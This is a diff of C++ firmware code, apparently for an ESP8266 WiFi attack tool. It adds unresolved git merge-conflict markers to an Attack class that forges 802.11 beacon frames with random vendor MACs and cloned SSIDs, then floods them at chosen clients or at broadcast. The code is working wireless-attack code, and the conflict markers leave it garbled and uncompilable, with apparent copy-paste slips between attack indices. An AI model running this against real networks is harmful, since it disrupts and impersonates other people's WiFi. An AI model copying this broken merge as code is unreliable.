@@ -5,12 +5,20 @@ Attack::Attack(){
 }
 
 void Attack::generate(){
+<<<<<<< HEAD
+=======
+  Attack::stopAll();
+>>>>>>> 0f3742b... Multi APs
   if(debug) Serial.print("generating Macs");
   
   Mac _randomBeaconMac;
   uint8_t _randomMacBuffer[6];
+<<<<<<< HEAD
   beaconAdrs._clear();
 
+=======
+  
+>>>>>>> 0f3742b... Multi APs
   do{
     getRandomVendorMac(_randomMacBuffer);
     for(int i=0;i<6;i++) _randomBeaconMac.setAt(_randomMacBuffer[i],i);
@@ -50,7 +58,11 @@ void Attack::buildBeacon(Mac _ap, Mac _client, String _ssid, int _ch, bool encry
 
   for(int i=0;i<6;i++){
     //set target (client)
+<<<<<<< HEAD
     //packet[4+i] = _client._get(i);
+=======
+    packet[4+i] = _client._get(i);
+>>>>>>> 0f3742b... Multi APs
     //set source (AP)
     packet[10+i] = packet[16+i] = _ap._get(i);
   }
@@ -83,18 +95,30 @@ void Attack::buildBeacon(Mac _ap, Mac _client, String _ssid, int _ch, bool encry
 }
 
 bool Attack::send(){
+<<<<<<< HEAD
   if(wifi_send_pkt_freedom(packet, packetSize, 0) == -1){
     /*if(debug){
+=======
+  delay(1); //less packets will be dropped
+  if(wifi_send_pkt_freedom(packet, packetSize, 0) == -1){
+    if(debug){
+>>>>>>> 0f3742b... Multi APs
       Serial.print(packetSize);
       Serial.print(" : ");
       PrintHex8(packet, packetSize);
       Serial.println("");
+<<<<<<< HEAD
     }*/
     return false;
   }else{
     delay(1); //less packets are beeing dropped
     return true;
   }
+=======
+    }
+    return false;
+  }else return true;
+>>>>>>> 0f3742b... Multi APs
 }
 
 void Attack::run(){
@@ -137,6 +161,7 @@ void Attack::run(){
         }
         
       } 
+<<<<<<< HEAD
     }
 
     prevTime[0] = millis();
@@ -216,6 +241,58 @@ void Attack::run(){
   if(isRunning[2] && currentMillis-prevTime[2] >= 1000){
     if(debug) Serial.print("running "+(String)attackNames[1]+" attack");
 
+=======
+    }
+
+    prevTime[0] = millis();
+    stati[0] = (String)packetsCounter[0]+"pkts/s";
+    packetsCounter[0] = 0;
+    if(debug) Serial.println(" done ");
+  }
+
+  if(isRunning[1] && currentMillis-prevTime[1] >= 1000){
+    if(debug) Serial.print("running "+(String)attackNames[1]+" attack");
+
+    for(int a=0;a<apScan.results;a++){
+      if(apScan.isSelected(a)){
+        String _ssid = apScan.getAPName(a);
+        int _ch = apScan.getAPChannel(a);
+
+        wifi_set_channel(_ch);
+
+        int _selectedClients = 0;
+        for(int i=0;i<clientScan.results;i++){
+          if(clientScan.getClientSelected(i)){
+            _selectedClients++;
+
+            buildBeacon(beaconAdrs._get(0),clientScan.getClientMac(i),_ssid+" 2",_ch,false);
+            for(int h=0;h<packetRate;h++) if(send()) packetsCounter[1]++;
+            
+          }
+        }
+        
+        if(_selectedClients == 0){
+          Mac _client;
+          _client.set(0xFF,0xFF,0xFF,0xFF,0xFF,0xFF);
+
+          buildBeacon(beaconAdrs._get(0),_client,_ssid+" 2",_ch,false);
+          for(int h=0;h<packetRate;h++) if(send()) packetsCounter[1]++;
+
+        }
+        
+      } 
+    }
+    
+    prevTime[1] = millis();
+    stati[1] = (String)packetsCounter[1]+"pkts/s";
+    packetsCounter[1] = 0;
+    if(debug) Serial.println(" done ");
+  }
+
+  if(isRunning[2] && currentMillis-prevTime[2] >= 1000){
+    if(debug) Serial.print("running "+(String)attackNames[1]+" attack");
+
+>>>>>>> 0f3742b... Multi APs
     prevTime[1] = millis();
     stati[1] = (String)packetsCounter[1]+"pkts/s";
     packetsCounter[1] = 0;
@@ -234,10 +311,19 @@ void Attack::start(int num){
 }
 
 void Attack::stop(int num){
+<<<<<<< HEAD
   if(isRunning[num] && debug) Serial.println("stopping "+(String)attackNames[num]+" attack");
   isRunning[num] = false;
   stati[num] = "ready";
   prevTime[num] = millis();
+=======
+  if(isRunning[num]){
+    isRunning[num] = false;
+    stati[num] = "ready";
+    prevTime[num] = millis();
+    if(debug) Serial.println("stopping "+(String)attackNames[num]+" attack");
+  }
+>>>>>>> 0f3742b... Multi APs
 }
 
 void Attack::stopAll(){
